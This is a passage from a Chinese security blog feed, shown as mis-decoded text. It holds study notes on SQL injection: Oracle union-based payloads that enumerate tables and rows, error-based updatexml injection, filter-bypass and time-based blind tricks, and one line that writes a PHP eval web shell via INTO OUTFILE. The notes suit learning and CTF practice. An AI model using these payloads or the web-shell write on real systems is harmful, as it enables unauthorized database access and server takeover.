FROM dba_sys_privs WHERE ADMIN_OPTION &#x3D; â€˜YESâ€™;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### æ³¨å…¥payload</span><br><span class="line">https://blog.csdn.net/Javachichi/article/details/128711756</span><br><span class="line">+ åˆ¤æ–­æ•°æ®åº“ç±»å‹</span><br></pre></td></tr></table></figure><p>â€“ ä½¿ç”¨ Oracle ä¸“æœ‰çš„å‡½æ•°åˆ¤æ–­æ˜¯å¦ä¸º Oracle æ•°æ®åº“<br>?ename&#x3D;-1â€™ or to_char(1)&#x3D;1â€“+<br>?ename&#x3D;-1â€™ or to_number(â€˜2e0â€™)&#x3D;2â€“+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">+ æŸ¥è¯¢è¡¨å</span><br></pre></td></tr></table></figure><p>?ename&#x3D;-1â€™ union select NULL,NULL,(select table_name from user_tables where rownum&#x3D;1),NULL from dualâ€“+<br>?ename&#x3D;-1â€™ union select NULL,NULL,(select table_name from user_tables where rownum&#x3D;1 and table_name&lt;&gt;â€™BONUSâ€™),NULL from dualâ€“+<br>?ename&#x3D;-1â€™ union select NULL,NULL,(select table_name from user_tables where rownum&#x3D;1 and table_name not in (â€˜BONUSâ€™,â€™DEPTâ€™)),NULL from dualâ€“+<br>?ename&#x3D;-1â€™ union select NULL,NULL,(select table_name from user_tables where rownum&#x3D;1 and table_name not in (â€˜BONUSâ€™,â€™DEPTâ€™,â€™EMPâ€™)),NULL from dualâ€“+<br>?ename&#x3D;-1â€™ union select NULL,NULL,(select table_name from user_tables where rownum&#x3D;1 and table_name not in (â€˜BONUSâ€™,â€™DEPTâ€™,â€™EMPâ€™)),NULL from dualâ€“+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">+ æŸ¥è¯¢è¡¨ä¸­çš„å­—æ®µå</span><br></pre></td></tr></table></figure><p>?ename&#x3D;-1â€™ union select NULL,NULL,(select column_name from user_tab_columns where table_name&#x3D;â€™EMPâ€™ and rownum&#x3D;1),NULL from dualâ€“+<br>?ename&#x3D;-1â€™ union select NULL,NULL,(select column_name from user_tab_columns where table_name&#x3D;â€™EMPâ€™ and rownum&#x3D;1 and column_name not in (â€˜EMPNOâ€™)),NULL from dualâ€“+<br>?ename&#x3D;-1â€™ union select NULL,NULL,(select column_name from user_tab_columns where table_name&#x3D;â€™EMPâ€™ and rownum&#x3D;1 and column_name not in (â€˜EMPNOâ€™,â€™ENAMEâ€™)),NULL from dualâ€“+<br>?ename&#x3D;-1â€™ union select NULL,NULL,(select column_name from user_tab_columns where table_name&#x3D;â€™EMPâ€™ and rownum&#x3D;1 and column_name not in (â€˜EMPNOâ€™,â€™ENAMEâ€™,â€™JOBâ€™)),NULL from dualâ€“+<br>?ename&#x3D;-1â€™ union select NULL,NULL,(select column_name from user_tab_columns where table_name&#x3D;â€™EMPâ€™ and rownum&#x3D;1 and column_name not in (â€˜EMPNOâ€™,â€™ENAMEâ€™,â€™JOBâ€™,â€™MGRâ€™)),NULL from dualâ€“+<br>?ename&#x3D;-1â€™ union select NULL,NULL,(select column_name from user_tab_columns where table_name&#x3D;â€™EMPâ€™ and rownum&#x3D;1 and column_name not in (â€˜EMPNOâ€™,â€™ENAMEâ€™,â€™JOBâ€™,â€™MGRâ€™,â€™HIREDATEâ€™)),NULL from dualâ€“+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">+ æŸ¥è¯¢å…·ä½“çš„æ•°æ®</span><br></pre></td></tr></table></figure><p>?ename&#x3D;-1â€™ union select NULL,NULL,(select ename from emp where rownum&#x3D;1),NULL from dualâ€“+<br>?ename&#x3D;-1â€™ union select NULL,NULL,(select ename from emp where rownum&#x3D;1 and ename&lt;&gt;â€™SMITHâ€™),NULL from dualâ€“+<br>?ename&#x3D;-1â€™ union select NULL,NULL,(select ename from emp where rownum&#x3D;1 and ename  not in (â€˜SMITHâ€™,â€™ALLENâ€™)),NULL from dualâ€“+<br>?ename&#x3D;-1â€™ union select NULL,NULL,(select ename from emp where rownum&#x3D;1 and ename  not in (â€˜SMITHâ€™,â€™ALLENâ€™,â€™WARDâ€™)),NULL from dualâ€“+<br>?ename&#x3D;-1â€™ union select NULL,NULL,(select ename from emp where rownum&#x3D;1 and ename  not in (â€˜SMITHâ€™,â€™ALLENâ€™,â€™WARDâ€™,â€™JONESâ€™)),NULL from dualâ€“+s<br>&#96;&#96;&#96;</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> upload,lfi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlæ³¨å…¥è¡¥è¯¾</title>
      <link href="/2025/06/06/sql-plus/"/>
      <url>/2025/06/06/sql-plus/</url>
      
        <content type="html"><![CDATA[<h1 id="SQLè¡¥è¯¾"><a href="#SQLè¡¥è¯¾" class="headerlink" title="SQLè¡¥è¯¾"></a>SQLè¡¥è¯¾</h1><p>æ–‡ç« æ¥è‡ªå‹é“¾<code>kirakiraayu</code><br>è‡ªå·±å¯¹ç€é‡æ–°<del>æŠ„å†™</del>å­¦ä¹ äº†ä¸€é</p><h1 id="è¯»å†™æ–‡ä»¶"><a href="#è¯»å†™æ–‡ä»¶" class="headerlink" title="è¯»å†™æ–‡ä»¶"></a>è¯»å†™æ–‡ä»¶</h1><ul><li>è¯»æ–‡ä»¶ä½¿ç”¨<code>load_file()</code>å‡½æ•°<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(&quot;E:\\flag.txt&quot;);</span><br></pre></td></tr></table></figure></li><li>å†™æ–‡ä»¶ä½¿ç”¨<code>into outfile</code><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>,<span class="number">3</span> <span class="keyword">into</span> outfile &quot;/var/www/html/shell.php&quot;;</span><br></pre></td></tr></table></figure></li></ul><h1 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h1><ul><li><h3 id="xpathæŠ¥é”™æ³¨å…¥ï¼ˆextractvalueå’Œupdatexmlï¼‰"><a href="#xpathæŠ¥é”™æ³¨å…¥ï¼ˆextractvalueå’Œupdatexmlï¼‰" class="headerlink" title="xpathæŠ¥é”™æ³¨å…¥ï¼ˆextractvalueå’Œupdatexmlï¼‰"></a>xpathæŠ¥é”™æ³¨å…¥ï¼ˆextractvalueå’Œupdatexmlï¼‰</h3></li></ul><p>updatexmlï¼ˆï¼‰</p><p>extractvalueï¼ˆï¼‰</p><p>å½“è¿™ä¸¤ä¸ªå‡½æ•°åœ¨æ‰§è¡Œæ—¶ï¼Œå¦‚æœå‡ºç°xmlæ–‡æ¡£è·¯å¾„é”™è¯¯å°±ä¼šäº§ç”ŸæŠ¥é”™</p><ul><li>updatexmlï¼ˆï¼‰å‡½æ•°<ul><li><p><code>updatexml()</code>æ˜¯ä¸€ä¸ªä½¿ç”¨ä¸åŒçš„xmlæ ‡è®°åŒ¹é…å’Œæ›¿æ¢xmlå—çš„å‡½æ•°ã€‚</p></li><li><p>ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼</p></li><li><p>è¯­æ³•ï¼š <code>updatexml(XML_documentï¼ŒXPath_stringï¼Œnew_value)</code> ç¬¬ä¸€ä¸ªå‚æ•°ï¼šæ˜¯<code>string</code>æ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc ç¬¬äºŒä¸ªå‚æ•°ï¼šä»£è¡¨è·¯å¾„ï¼ŒXpathæ ¼å¼çš„å­—ç¬¦ä¸²ä¾‹å¦‚<code>//titleã€@langã€‘</code> ç¬¬ä¸‰ä¸ªå‚æ•°ï¼š<code>string</code>æ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®</p></li><li><p>updatexmlä½¿ç”¨æ—¶ï¼Œå½“<code>xpath_string</code>æ ¼å¼å‡ºç°é”™è¯¯ï¼Œmysqlåˆ™ä¼šçˆ†å‡ºxpathè¯­æ³•é”™è¯¯<code>(xpath syntax)</code></p></li><li><p>ä¾‹å¦‚ï¼š <code>select * from test where ide = 1 and (updatexml(1,0x7e,3));</code>ç”±äº0x7eæ˜¯~ï¼Œä¸å±äºxpathè¯­æ³•æ ¼å¼ï¼Œå› æ­¤æŠ¥å‡ºxpathè¯­æ³•é”™è¯¯ã€‚</p></li></ul></li></ul><h1 id="å¸¸è§ç»•è¿‡æ–¹å¼"><a href="#å¸¸è§ç»•è¿‡æ–¹å¼" class="headerlink" title="å¸¸è§ç»•è¿‡æ–¹å¼"></a>å¸¸è§ç»•è¿‡æ–¹å¼</h1><p>ç¤ºä¾‹è¯­å¥ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> GROUP_CONCAT(schema_name) <span class="keyword">FROM</span> information_schema.schemata;</span><br></pre></td></tr></table></figure><ul><li><h3 id="è¿‡æ»¤ç©ºæ ¼"><a href="#è¿‡æ»¤ç©ºæ ¼" class="headerlink" title="è¿‡æ»¤ç©ºæ ¼"></a>è¿‡æ»¤ç©ºæ ¼</h3></li></ul><p>å¯ä»¥ä½¿ç”¨æ‹¬å·åŒ…è£¹</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>(GROUP_CONCAT(schema_name))<span class="keyword">FROM</span>(information_schema.schemata);</span><br></pre></td></tr></table></figure><p>å†…è”æ³¨é‡Š<code>/**/</code>å¯ä»¥ä»£æ›¿ç©ºæ ¼</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span><span class="comment">/**/</span>GROUP_CONCAT(schema_name)<span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span>information_schema.schemata;</span><br></pre></td></tr></table></figure><p>ç¬¦å·ä»£æ›¿ç©ºæ ¼çš„æ–¹å¼(urlencode)ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0D Carriage Returnï¼Œå›è½¦ ä»£æ›¿ç©ºæ ¼</span><br><span class="line">%0A Line Feedï¼Œæ¢è¡Œ ä»£æ›¿ç©ºæ ¼</span><br><span class="line">%0C Form Feedï¼Œæ¢é¡µ ä»£æ›¿ç©ºæ ¼</span><br><span class="line">%09 Horizontal Tabï¼Œæ°´å¹³åˆ¶è¡¨ ä»£æ›¿ç©ºæ ¼</span><br><span class="line">%0B Vertical Tabï¼Œå‚ç›´åˆ¶è¡¨ ä»£æ›¿ç©ºæ ¼</span><br><span class="line">%A0 Non-breaking space (MySQL only)ï¼Œä¸é—´æ–­ç©ºæ ¼ ä»£æ›¿ç©ºæ ¼</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨åå¼•å·åŒ…è£¹å˜é‡å</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>(GROUP_CONCAT(schema_name))<span class="keyword">FROM</span>`information_schema`.`schemata`;</span><br></pre></td></tr></table></figure><ul><li><h3 id="è¿‡æ»¤å¼•å·"><a href="#è¿‡æ»¤å¼•å·" class="headerlink" title="è¿‡æ»¤å¼•å·"></a>è¿‡æ»¤å¼•å·</h3></li></ul><p>åŒæ—¶æŸ¥è¯¢ç”¨æˆ·åå’Œå¯†ç çš„æƒ…å†µä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;1\&#x27;</span> <span class="keyword">AND</span> passwd<span class="operator">=</span><span class="string">&#x27; UNION SELECT 1,2,3--&#x27;</span> </span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1\&amp;passwd=UNION SELECT 1,2,3--</span><br></pre></td></tr></table></figure><p>è¿™æ ·å®é™…ä¸Šç¬¬äºŒä¸ªå¼•å·è¢«è½¬ä¹‰æ‰äº†<br>é‚£ä¹ˆå¯†ç çš„éƒ¨åˆ†ç›´æ¥è¾“å…¥<code>&lt;è”åˆæ³¨å…¥è¯­å¥&gt;</code>+<code>&lt;æ³¨é‡Š&gt;</code>å³å¯</p><p>ä¹Ÿå¯ä»¥åå…­è¿›åˆ¶ç¼–ç ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">0x616263</span>;  # abc</span><br></pre></td></tr></table></figure><p>è‡ªåŠ¨å˜æˆå­—ç¬¦ä¸²</p><ul><li><h3 id="è¿‡æ»¤é€—å·"><a href="#è¿‡æ»¤é€—å·" class="headerlink" title="è¿‡æ»¤é€—å·"></a>è¿‡æ»¤é€—å·</h3></li></ul><p>ä¾‹å¦‚éœ€è¦å¤šåˆ—æŸ¥è¯¢æ—¶ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>join</code>:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span>) <span class="keyword">AS</span> a <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">2</span>) <span class="keyword">AS</span> b <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">2</span>) <span class="keyword">AS</span> c;</span><br></pre></td></tr></table></figure><p>ç›²æ³¨å¸¸ç”¨çš„ <code>substring()</code> <code>substr()</code> <code>mid()</code> ä¸­,<br>ä¼šç”¨åˆ°é€—å· å¯ä»¥ä½¿ç”¨ from for ä»£æ›¿:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(DATABASE() <span class="keyword">FROM</span> <span class="number">1</span> <span class="keyword">FOR</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">SELECT</span> SUBSTR(DATABASE() <span class="keyword">FROM</span> <span class="number">1</span> <span class="keyword">FOR</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">SELECT</span> MID(DATABASE() <span class="keyword">FROM</span> <span class="number">1</span> <span class="keyword">FOR</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>LIMIT è¯­æ³•ä¹Ÿä¼šç”¨åˆ°é€—å·ï¼Œå¯ä»¥ä½¿ç”¨ offset ä»£æ›¿:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users LIMIT 1 OFFSET 0;</span><br></pre></td></tr></table></figure><p>ç›²æ³¨ä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨æ¨¡ç³ŠæŸ¥è¯¢çš„æ–¹æ³•æ¥é¿å…ä½¿ç”¨é€—å·:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DATABASE() <span class="keyword">LIKE</span> <span class="string">&#x27;s%&#x27;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ç­‰ä»·äº SELECT ASCII(SUBSTRING(DATABASE(), 1, 1))=115;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">s% æ˜¯ä¸€ä¸ªæ¨¡å¼å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ % æ˜¯é€šé…ç¬¦</span></span><br><span class="line"><span class="comment">% è¡¨ç¤ºä»»æ„æ•°é‡çš„å­—ç¬¦ï¼ˆåŒ…æ‹¬é›¶ä¸ªå­—ç¬¦ï¼‰</span></span><br><span class="line"><span class="comment">s% åŒ¹é…æ‰€æœ‰ä»¥ s å¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œä¸è®ºå…¶åæœ‰å¤šå°‘å­—ç¬¦</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>LIKE æ”¯æŒä»¥ä¸‹é€šé…ç¬¦ï¼š</p><ul><li>%ï¼šåŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚</li><li>_ï¼šåŒ¹é…å•ä¸ªå­—ç¬¦ã€‚</li></ul><p>ç¤ºä¾‹ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LIKE</span> <span class="string">&#x27;u%&#x27;</span>ï¼šåŒ¹é…ä»¥ u å¼€å¤´çš„æ‰€æœ‰å­—ç¬¦ä¸²ã€‚</span><br><span class="line"><span class="keyword">LIKE</span> <span class="string">&#x27;%123&#x27;</span>ï¼šåŒ¹é…ä»¥ <span class="number">123</span> ç»“å°¾çš„æ‰€æœ‰å­—ç¬¦ä¸²ã€‚</span><br><span class="line"><span class="keyword">LIKE</span> <span class="string">&#x27;_b%&#x27;</span>ï¼šåŒ¹é…ç¬¬äºŒä¸ªå­—ç¬¦æ˜¯ b çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼ˆå¦‚ ab123ã€cb_testï¼‰ã€‚</span><br><span class="line"><span class="keyword">LIKE</span> <span class="string">&#x27;t__t&#x27;</span>ï¼šåŒ¹é… t å¼€å¤´ã€æ¥ä¸¤ä¸ªå­—ç¬¦ã€ç„¶åæ˜¯ t çš„å­—ç¬¦ä¸²ï¼ˆå¦‚ testï¼‰</span><br></pre></td></tr></table></figure><ul><li><h3 id="è¿‡æ»¤æ¯”è¾ƒç¬¦"><a href="#è¿‡æ»¤æ¯”è¾ƒç¬¦" class="headerlink" title="è¿‡æ»¤æ¯”è¾ƒç¬¦"></a>è¿‡æ»¤æ¯”è¾ƒç¬¦</h3></li></ul><p>è¿‡æ»¤<code>&gt;</code>å’Œ<code>&lt;</code>æ—¶<br>å¯ä»¥ä½¿ç”¨<code>greatest()</code>å’Œ<code>least()</code>å‡½æ•°ï¼Œ<br>åˆ†åˆ«è¿”å›æœ€å¤§å€¼å’Œæœ€å°å€¼ã€‚å‚æ•°æ•°é‡ä¸å®š:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> GREATEST(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">SELECT</span> LEAST(<span class="number">1</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>ä»£æ›¿ç­‰å·ç”¨<code>like</code>ä½†æœ‰æ—¶ä¼šæœ‰ä¸ç›¸ç­‰è¿˜è¿”å›1</p><p>ç”¨<code>rlike</code>åˆ¤æ–­æŸä¸ªå­—æ®µçš„å€¼æ˜¯å¦åŒ¹é…æŒ‡å®šçš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œ<br>å®ƒæ˜¯<code>regexp</code>çš„åŒä¹‰è¯</p><p>ç”¨<code>regexp</code>åŒ¹é…å­—ç¬¦ä¸²ä¸­æ˜¯å¦åŒ…å«ç¬¦åˆæ­£åˆ™è§„åˆ™çš„éƒ¨åˆ†,<br>é»˜è®¤ä¸åŒºåˆ†å¤§å°å†™,<br>å¦‚æœéœ€è¦åŒºåˆ†ï¼Œå¯ä»¥ä½¿ç”¨<code>binary</code>:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;abc&#x27;</span> REGEXP <span class="string">&#x27;A&#x27;</span>;       <span class="comment">-- è¿”å› 1</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="type">BINARY</span> <span class="string">&#x27;abc&#x27;</span> REGEXP <span class="string">&#x27;A&#x27;</span>; <span class="comment">-- è¿”å› 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="type">BINARY</span> DATABASE() REGEXP <span class="string">&#x27;^s&#x27;</span>;</span><br></pre></td></tr></table></figure><p>å‡½æ•°<br><code>strcmp(str1, str2)</code><br>å…¶è¿”å›å€¼:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">str1 = str2 -&gt; 0</span><br><span class="line">str1 &lt; str2 -&gt; -1</span><br><span class="line">str1 &gt; str2 -&gt; 1</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç”¨<code>in</code>è¯­æ³•ï¼Œ<br>ç”¨äºåˆ¤æ–­æŸä¸ªå€¼æ˜¯å¦åœ¨æŒ‡å®šé›†åˆä¸­çš„æ¡ä»¶æ“ä½œç¬¦:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- æ˜¯åˆ™è¿”å› 1,å¦åˆ™è¿”å› 0</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="built_in">SUBSTRING</span>(DATABASE(), <span class="number">1</span>, <span class="number">1</span>)) <span class="keyword">IN</span> (<span class="number">115</span>);</span><br></pre></td></tr></table></figure><p>ç”¨<code>between...and...</code>è¿›è¡ŒèŒƒå›´æŸ¥è¯¢ï¼Œä¹Ÿå¯ä»£æ›¿ç­‰å·</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- æ˜¯ 115 åˆ™è¿”å› 1,å¦åˆ™è¿”å› 0</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="built_in">SUBSTRING</span>(DATABASE(), <span class="number">1</span>, <span class="number">1</span>)) <span class="keyword">BETWEEN</span> <span class="number">115</span> <span class="keyword">AND</span> <span class="number">115</span>;</span><br></pre></td></tr></table></figure><p>ç”¨<code>&lt;&gt;</code>è¡¨ç¤ºä¸ç­‰äº</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- ä¸ç­‰äº 115 åˆ™è¿”å› 1,å¦åˆ™è¿”å› 0</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="built_in">SUBSTRING</span>(DATABASE(), <span class="number">1</span>, <span class="number">1</span>)) <span class="operator">&lt;&gt;</span> <span class="number">115</span>;</span><br></pre></td></tr></table></figure><ul><li><h3 id="è¿‡æ»¤é€»è¾‘è¿ç®—ç¬¦"><a href="#è¿‡æ»¤é€»è¾‘è¿ç®—ç¬¦" class="headerlink" title="è¿‡æ»¤é€»è¾‘è¿ç®—ç¬¦"></a>è¿‡æ»¤é€»è¾‘è¿ç®—ç¬¦</h3></li></ul><p>å¯ä»¥ä¸è‹±æ–‡å•è¯äº’ç›¸æ›¿æ¢:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="operator">&amp;&amp;</span></span><br><span class="line"><span class="keyword">or</span> <span class="operator">||</span></span><br><span class="line"><span class="keyword">not</span> <span class="operator">!</span></span><br><span class="line">xor <span class="operator">|</span></span><br></pre></td></tr></table></figure><ul><li><h3 id="è¿‡æ»¤-if"><a href="#è¿‡æ»¤-if" class="headerlink" title="è¿‡æ»¤ if"></a>è¿‡æ»¤ if</h3></li></ul><p>é€»è¾‘ä¸­æ–­: <code>OR ||</code><br>åªéœ€ä¸€ä¸ªè¡¨è¾¾å¼ä¸ºçœŸï¼Œæ•´ä¸ªè¡¨è¾¾å¼å°±ä¸ºçœŸã€‚<br>é‚£ä¹ˆå¾ˆå¤šæ—¶å€™ç¨‹åºåªåˆ¤æ–­åˆ°å‰ä¸€ä¸ªè¡¨è¾¾å¼ä¸ºçœŸæ—¶ï¼Œ<br>å°±å¿½ç•¥åä¸€ä¸ªè¡¨è¾¾å¼ä¸æ‰§è¡Œï¼Œ<code>MySQL</code>å°±å…·å¤‡è¿™ä¸ªç‰¹æ€§ã€‚<br>å¯ä»¥åˆ©ç”¨å®ƒè¾¾åˆ°æ¡ä»¶åˆ¤æ–­çš„æ•ˆæœ:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- å‡è®¾ database ä¸º &quot;security&quot;</span></span><br><span class="line"><span class="comment">-- å®ƒä¸ä¼šæ‰§è¡Œ SLEEPï¼Œå› ä¸ºå‰ä¸€ä¸ªè¡¨è¾¾å¼ä¸ºçœŸ</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="built_in">SUBSTRING</span>(DATABASE(), <span class="number">1</span>, <span class="number">1</span>))<span class="operator">=</span><span class="number">115</span> <span class="operator">||</span> SLEEP(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- å®ƒä¼šæ‰§è¡Œ SLEEPï¼Œå› ä¸ºå‰ä¸€ä¸ªè¡¨è¾¾å¼ä¸ºå‡ï¼Œç¨‹åºè¿˜éœ€è¦åˆ¤æ–­åä¸€ä¸ªè¡¨è¾¾å¼æ‰èƒ½ç¡®å®šæ•´ä¸ªè¡¨è¾¾å¼çš„å€¼</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="built_in">SUBSTRING</span>(DATABASE(), <span class="number">1</span>, <span class="number">1</span>))<span class="operator">=</span><span class="number">114</span> <span class="operator">||</span> SLEEP(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>locate(str1, str2)</code><br>æ¯”è¾ƒè¾“å…¥çš„ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œ<br>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å‚ç…§ç‰©ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å‚ç…§å¯¹è±¡ï¼Œ<br>è¯¥å‡½æ•°ä¼šåˆ¤æ–­å‚ç…§å¯¹è±¡ä¸­æ˜¯å¦å«æœ‰å‚ç…§ç‰©ï¼Œ<br>è‹¥ä¸å«æœ‰ï¼Œåˆ™è¿”å› 0ï¼›<br>è‹¥å«æœ‰ï¼Œåˆ™è¿”å›è¯¥å‚ç…§ç‰©åœ¨å‚ç…§å¯¹è±¡ä¸­çš„ä½ç½®:</p><p>ç”¨<code>case when...then...else...end</code><br>ç”¨æ³•ç±»ä¼¼äºä¸‰ç›®è¿ç®—ç¬¦</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="keyword">condition</span> <span class="keyword">THEN</span> result1 <span class="keyword">ELSE</span> result2 <span class="keyword">END</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 1</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">2</span> <span class="keyword">END</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">2</span> <span class="keyword">END</span>;</span><br></pre></td></tr></table></figure><p>ç”¨<code>elt(N, str1, str2, ..., strN)</code><br>ä»ä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨ä¸­è¿”å›å¯¹åº”ä½ç½®çš„å­—ç¬¦ä¸²<br>å‡è®¾æœ‰ä¸€å¼ è¡¨ my_tableï¼Œ<br>åŒ…å«å­—æ®µ id å’Œ categoryï¼Œ<br>æˆ‘ä»¬å¸Œæœ›æ ¹æ® category çš„å€¼è¿”å›å¯¹åº”å­—ç¬¦ä¸²ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id, ELT(category, <span class="string">&#x27;Electronics&#x27;</span>, <span class="string">&#x27;Books&#x27;</span>, <span class="string">&#x27;Clothing&#x27;</span>)</span><br><span class="line"><span class="keyword">AS</span> category_name</span><br><span class="line"><span class="keyword">FROM</span> my_table;</span><br></pre></td></tr></table></figure><p>å¦‚æœ category çš„å€¼ä¸º 1ã€2 æˆ– 3ï¼Œ<br>åˆ†åˆ«è¿”å› Electronicsã€Booksã€Clothing</p><p>è¿™ä¸ªå‡½æ•°åŒæ ·å¯ä»¥ç”¨åœ¨ç›²æ³¨ä¸­,<br>é€»è¾‘è¿ç®—å¾€å¾€ä¼šè¿”å› 0 æˆ– 1ï¼Œ<br>ä¹Ÿå°±æ˜¯è¯´å¯ä»¥è®©æ¡ä»¶ä¸ºçœŸæ—¶,<br>æ‰§è¡Œ<code>elt</code>å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°çš„è¡¨è¾¾å¼</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- æ¡ä»¶ä¸ºçœŸæ—¶ä¼šç¡ 3 ç§’</span></span><br><span class="line"><span class="keyword">SELECT</span> ELT((LENGTH(DATABASE())<span class="operator">&gt;</span><span class="number">3</span>), SLEEP(<span class="number">3</span>));</span><br></pre></td></tr></table></figure><ul><li><h3 id="è¿‡æ»¤å…³é”®å­—"><a href="#è¿‡æ»¤å…³é”®å­—" class="headerlink" title="è¿‡æ»¤å…³é”®å­—"></a>è¿‡æ»¤å…³é”®å­—</h3></li></ul><p>å¦‚æœåªæ˜¯å•çº¯å»æ‰ï¼Œé‚£å°±åŒå†™ç»•è¿‡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union -&gt; 